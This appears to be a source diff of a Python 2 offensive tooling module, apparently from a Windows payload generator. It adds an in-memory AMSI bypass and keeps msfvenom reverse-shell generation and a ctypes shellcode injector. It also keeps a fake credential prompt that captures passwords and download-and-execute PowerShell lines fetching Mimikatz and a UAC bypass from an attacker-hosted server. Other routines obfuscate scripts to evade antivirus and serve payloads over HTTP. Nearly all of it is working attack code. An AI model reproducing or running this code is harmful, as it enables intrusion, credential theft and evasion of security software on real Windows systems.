@@ -4,26 +4,14 @@ import os
 import socket
 import re
 import subprocess
-import struct
 import sys
 import blessed
 import random
 import SimpleHTTPServer
 import SocketServer
 import multiprocessing
-from Crypto.Cipher import AES
-import base64
-import string
-import glob
-import readline
 import time
-import psexec
-import urllib2
-from collections import OrderedDict
 import string
-import asyncore
-import ssl
-import threading
 import prompt_toolkit
 from prompt_toolkit.contrib.completers import WordCompleter
 import netifaces
@@ -59,43 +47,17 @@ helpDict = {
 }
 
 
-def sandboxChoose(choice):
-    from menu import sandboxMenuOptions, getAndRunSandboxMenu
-    if sandboxMenuOptions[choice]['availablemodules']:
-        sandboxMenuOptions[choice]['availablemodules'] = None
-    else:
-        sandboxMenuOptions[choice]['availablemodules'] = {str('ON'): ''}
-    return "clear"
+amsiPatch = """
+$w = @"
+using System;using System.Runtime.InteropServices;public class Win32 {[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string name);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}
+"@;Add-Type $w;$l = [Win32]::LoadLibrary("am" + "si.dll");$a = [Win32]::GetProcAddress($l, "Amsi" + "Scan" + "Buffer");[Win32]::VirtualProtect($a, [uint32]5, 0x40, [ref]0);[System.Runtime.InteropServices.Marshal]::Copy([Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, $a, 6);
+"""
 
 
-def payloaddir():
-    return os.path.expanduser('~') + '/winpayloads'
-
-def msfvenomGeneration(payload, ip, port):
-    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python', '-e', 'x86/shikata_ga_nai'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    LOADING = Spinner('Generating Shellcode')
-    while p.poll() == None:
-        LOADING.Update()
-        time.sleep(0.2)
-    print '\r',
-    sys.stdout.flush()
-
-    payload = p.stdout.read()
-    compPayload = re.findall(r'"(.*?)"', payload)
-
-    return ''.join(map(str, compPayload))
-
-
-def getHelp(*helpItem):
-    helpItem = ''.join(helpItem)
-    if helpDict.has_key(helpItem):
-        return helpDict[helpItem]
-    else:
-        return t.bold_red + '[!] Enter a valid menu option to recieve help'
-
-class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler): #patching httpserver to shutup
+class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return
+
 
 class InterfaceSelecta():
     def __init__(self):
@@ -130,7 +92,6 @@ class InterfaceSelecta():
                 else:
                     self.interface = interface
 
-
     def ChooseInterface(self, set=False):
         if set:
             for i in self.interfaces:
@@ -150,134 +111,8 @@ class InterfaceSelecta():
         return self.interface
 
 
-
-class SHELLCODE(object):
-    @staticmethod
-    def windows_rev_shell(ip, port):
-        return msfvenomGeneration('windows/shell_reverse_tcp', ip, port)
-
-    @staticmethod
-    def windows_met_rev_shell(ip, port):
-        return msfvenomGeneration('windows/meterpreter/reverse_tcp', ip, port)
-
-    @staticmethod
-    def windows_met_bind_shell(ip, port):
-        return msfvenomGeneration('windows/meterpreter/bind_tcp', ip, port)
-
-    @staticmethod
-    def windows_met_rev_https_shell(ip, port):
-        return msfvenomGeneration('windows/meterpreter/reverse_https', ip, port)
-
-    @staticmethod
-    def windows_met_rev_shell_dns(ip, port):
-        return msfvenomGeneration('windows/meterpreter/reverse_tcp_dns', ip, port)
-
-    @staticmethod
-    def windows_custom_shellcode():
-        customshell = ''
-        print 'Paste custom shellcode below\nType \'END\' when done.'
-        while True:
-            buildstr = raw_input().rstrip()
-            if buildstr == 'END':
-                break
-            else:
-                customshell += buildstr
-        return customshell
-
-    @staticmethod
-    def windows_ps_ask_creds_tcp():
-        return (
-            "$ErrorActionPreference=\'SilentlyContinue\';Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
-            "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
-            "$domainDN = \'LDAP://\' + ([ADSI]\'\').distinguishedName;"
-            "$credential = $host.ui.PromptForCredential(\'Credentials are required to perform this operation!\', \'\', \'\', \'\');"
-            "if($credential){$creds = $credential.GetNetworkCredential();$user = $creds.username;$pass = $creds.password;"
-            "echo \' INCORRECT:\'$user\':\'$pass;"
-            "$authlocal = $DS.ValidateCredentials($user, $pass);"
-            "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
-            "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
-            "echo \' CORRECT:\'$user\':\'$pass}}")
-
-    @staticmethod
-    def windows_invoke_mimikatz():
-        return (
-            "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-Mimikatz.ps1\\\");"
-            "Invoke-Mimikatz -DumpCreds")
-
-    @staticmethod
-    def windows_uac_bypass():
-        return (
-            "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\\\");"
-            "Invoke-SilentCleanUpBypass -Command \\\"powershell.exe -c %s\\\"")
-
-
-    injectwindows = """
-shellcode = bytearray('%s')
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
-bufe = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),bufe,ctypes.c_int(len(shellcode)))
-ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-"""
-
-
-class FUNCTIONS(object):
-
-    def powershellShellcodeLayout(self,powershellExec):
-        powershellShellcode = re.sub(r'\\x', '0x', powershellExec)
-        count = 0
-        newpayloadlayout = ''
-        for char in powershellShellcode:
-            count += 1
-            newpayloadlayout += char
-            if count == 4:
-                newpayloadlayout += ','
-                count = 0
-        return newpayloadlayout
-
-    def ServePayload(self, payloaddirectory, IP, port):
-        try:
-            os.chdir(payloaddirectory)
-            httpd = SocketServer.TCPServer((IP, port), HANDLER)
-            httpd.serve_forever()
-        except KeyboardInterrupt:
-            pass
-        except:
-            print t.bold_red + '\n[*] Port in use' + t.normal
-
-    def DoServe(self, IP, payloadname, payloaddir, port, printIt):
-        if printIt:
-            print t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal
-        a = multiprocessing.Process(
-            target=self.ServePayload, args=(payloaddir, IP, port))
-        a.daemon = True
-        a.start()
-
-    def randomUnusedPort(self):
-        from menu import returnIP
-        s = socket.socket()
-        s.bind((returnIP(), 0))
-        port = s.getsockname()[1]
-        s.close()
-        return port
-
-    def stagePowershellCode(self, powershellFileContents, port):
-        from menu import returnIP
-        DIR = 'stager'
-        if not os.path.isdir(DIR):
-            os.mkdir(DIR)
-        os.chdir(DIR)
-        with open('stage.ps1','w') as psFile:
-            psFile.write(powershellFileContents)
-        httpd = SocketServer.TCPServer((returnIP(), port), HANDLER)
-        httpd.handle_request()
-        os.chdir('..')
-        import shutil
-        shutil.rmtree(DIR)
-
 class Spinner(object):
-
-    def __init__(self,text):
+    def __init__(self, text):
         self.spinner = [
             ["|", "\\", "-", "/"],
             ["▁","▃","▄","▅","▆","▇","█","▇","▆","▅","▄","▃"],
@@ -310,3 +145,233 @@ class Spinner(object):
         self.Looper(self.randomchoice[self.x % self.spin_1] + " " + "".join(
             self.loading[0: (self.spin_2mod)]) + (" " * (self.spin_2 - self.spin_2mod)))
         self.x += 1
+
+
+def windows_rev_shell(ip, port):
+    return msfvenomGeneration('windows/shell_reverse_tcp', ip, port)
+
+
+def windows_met_rev_shell(ip, port):
+    return msfvenomGeneration('windows/meterpreter/reverse_tcp', ip, port)
+
+
+def windows_met_bind_shell(ip, port):
+    return msfvenomGeneration('windows/meterpreter/bind_tcp', ip, port)
+
+
+def windows_met_rev_https_shell(ip, port):
+    return msfvenomGeneration('windows/meterpreter/reverse_https', ip, port)
+
+
+def windows_met_rev_shell_dns(ip, port):
+    return msfvenomGeneration('windows/meterpreter/reverse_tcp_dns', ip, port)
+
+
+def windows_custom_shellcode():
+    customshell = ''
+    print 'Paste custom shellcode below\nType \'END\' when done.'
+    while True:
+        buildstr = raw_input().rstrip()
+        if buildstr == 'END':
+            break
+        else:
+            customshell += buildstr
+    return customshell
+
+
+def windows_ps_ask_creds_tcp():
+    return (
+        "$ErrorActionPreference=\'SilentlyContinue\';Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
+        "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
+        "$domainDN = \'LDAP://\' + ([ADSI]\'\').distinguishedName;"
+        "$credential = $host.ui.PromptForCredential(\'Credentials are required to perform this operation!\', \'\', \'\', \'\');"
+        "if($credential){$creds = $credential.GetNetworkCredential();$user = $creds.username;$pass = $creds.password;"
+        "echo \' INCORRECT:\'$user\':\'$pass;"
+        "$authlocal = $DS.ValidateCredentials($user, $pass);"
+        "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
+        "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
+        "echo \' CORRECT:\'$user\':\'$pass}}")
+
+
+def windows_invoke_mimikatz():
+    return (
+        "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s.ps1');"
+        "%s -%s")
+
+
+def windows_uac_bypass():
+    return (
+        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\\\");"
+        "Invoke-SilentCleanUpBypass -Command \\\"powershell.exe -c %s\\\"")
+
+
+injectwindows = """
+shellcode = bytearray('%s')
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
+bufe = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),bufe,ctypes.c_int(len(shellcode)))
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+"""
+
+
+def randomVar(len):
+    return ''.join(random.sample(string.ascii_lowercase, len))
+
+
+def removeComments(string):
+    string = re.sub(re.compile(r'<\#.*?\#>', flags=re.DOTALL), '', string)
+    string = re.sub(re.compile(r'#.*?\n'), '\\n', string)
+    return string
+
+
+def removeAVStrings(string):
+    badStrings = ['shellcode']
+    for bad in badStrings:
+        string = re.sub(bad, randomVar(5), string, flags=re.IGNORECASE)
+    return string
+
+
+def randomisePS1(filename):
+    ps1Changes = {
+        'Invoke-Shellcode': {
+            'paramR': r'\[\'{}\'\]',
+            'args': [
+                '$Shellcode',
+                '$Force',
+                '$ProcessID'
+            ],
+            'filename': '{}-{}'
+        },
+        'Invoke-Mimikatz': {
+            'paramR': r'\"{}\"',
+            'args': [
+                '$DumpCreds',
+                '$Command',
+            ],
+            'filename': '{}-{}'
+        },
+        'Invoke-BypassUAC': {
+            'filename': '{}-{}'
+        },
+        'Invoke-SilentCleanUpBypass': {
+            'filename': '{}-{}'
+        },
+        'PowerUp': {
+            'filename': '{}'
+        },
+    }
+    with open('externalmodules/{}.ps1'.format(filename), 'r') as originalPS1:
+        newFileChanges = {
+            'filename': '',
+            'params': {}
+        }
+        ps1Content = originalPS1.read()
+        paramRegex = ps1Changes[filename].get('paramR')
+        ps1Arguments = ps1Changes[filename].get('args')
+        newFileName = ps1Changes[filename].get('filename').format(randomVar(4), randomVar(6))
+        for i, j in enumerate(ps1Arguments):
+            newParam = randomVar(7)
+            cleanNewArg = '$' + newParam
+            ps1Content = ps1Content.replace(j, cleanNewArg)
+            newFileChanges['params'][j.replace('$', '')] = newParam
+
+        for param, newParam in newFileChanges['params'].items():
+            paramSearchRegex = paramRegex.format(param.replace('$', ''))
+            changeParam = paramRegex.format(newParam).replace('\\', '')
+            regSearch = re.findall(paramSearchRegex, ps1Content)
+            if regSearch:
+                for originalParam in regSearch:
+                    ps1Content = ps1Content.replace(originalParam, changeParam, len(regSearch))
+        ps1Content = ps1Content.replace(filename, newFileName)
+        ps1Content = removeComments(ps1Content)
+        ps1Content = removeAVStrings(ps1Content)
+
+        with open('externalmodules/staged/{}.ps1'.format(newFileName), 'w') as newPS1:
+            newPS1.write(ps1Content)
+            newFileChanges['filename'] = newFileName
+        return newFileChanges
+
+def sandboxChoose(choice):
+    from menu import sandboxMenuOptions, getAndRunSandboxMenu
+    if sandboxMenuOptions[choice]['availablemodules']:
+        sandboxMenuOptions[choice]['availablemodules'] = None
+    else:
+        sandboxMenuOptions[choice]['availablemodules'] = {str('ON'): ''}
+    return "clear"
+
+def payloaddir():
+    return os.path.expanduser('~') + '/winpayloads'
+
+def msfvenomGeneration(payload, ip, port):
+    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python', '-e', 'x86/shikata_ga_nai'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    LOADING = Spinner('Generating Shellcode')
+    while p.poll() == None:
+        LOADING.Update()
+        time.sleep(0.2)
+    print '\r',
+    sys.stdout.flush()
+
+    payload = p.stdout.read()
+    compPayload = re.findall(r'"(.*?)"', payload)
+
+    return ''.join(map(str, compPayload))
+
+
+def getHelp(*helpItem):
+    helpItem = ''.join(helpItem)
+    if helpDict.has_key(helpItem):
+        return helpDict[helpItem]
+    else:
+        return t.bold_red + '[!] Enter a valid menu option to recieve help'
+
+def powershellShellcodeLayout(powershellExec):
+    powershellShellcode = re.sub(r'\\x', '0x', powershellExec)
+    count = 0
+    newpayloadlayout = ''
+    for char in powershellShellcode:
+        count += 1
+        newpayloadlayout += char
+        if count == 4:
+            newpayloadlayout += ','
+            count = 0
+    return newpayloadlayout
+
+def ServePayload(payloaddirectory, IP, port):
+    try:
+        os.chdir(payloaddirectory)
+        httpd = SocketServer.TCPServer((IP, port), HANDLER)
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    except:
+        print t.bold_red + '\n[*] Port in use' + t.normal
+
+def DoServe(IP, payloadname, payloaddir, port, printIt):
+    if printIt:
+        print t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal
+    a = multiprocessing.Process(
+        target=ServePayload, args=(payloaddir, IP, port))
+    a.daemon = True
+    a.start()
+
+def randomUnusedPort():
+    from menu import returnIP
+    s = socket.socket()
+    s.bind((returnIP(), 0))
+    port = s.getsockname()[1]
+    s.close()
+    return port
+
+def stagePowershellCode(powershellFileContents, port, dir='stager'):
+    from menu import returnIP
+    if not os.path.isdir(dir):
+        os.mkdir(dir)
+    os.chdir(dir)
+    with open('stage.ps1', 'w') as psFile:
+        psFile.write(powershellFileContents)
+    httpd = SocketServer.TCPServer((returnIP(), port), HANDLER)
+    httpd.handle_request()
+    os.chdir('..')
+    import shutil
+    shutil.rmtree(dir)
